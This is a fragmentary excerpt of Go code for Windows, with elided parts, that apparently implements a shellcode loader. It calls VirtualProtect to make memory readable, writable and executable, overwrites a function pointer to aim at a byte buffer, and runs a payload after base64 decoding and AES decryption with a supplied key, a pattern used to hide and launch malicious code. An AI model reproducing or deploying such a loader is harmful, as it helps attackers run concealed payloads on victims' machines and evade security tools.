...
var p_vp = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VP(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
...
func doWork(something []byte) {
	...
	if !VP(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {

		panic("call to VP failed!")

	}

	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&something))

	var oldshellcodeperms uint32

	if !VP(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&something))), uintptr(len(something)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
...
func process(_key string, value string) {

	decoded, _ := base64.StdEncoding.DecodeString(value)

	var key []byte = []byte(_key)

	aes_decrypted, _ := aesDecrypt(decoded, key)

	doWork(aes_decrypted)
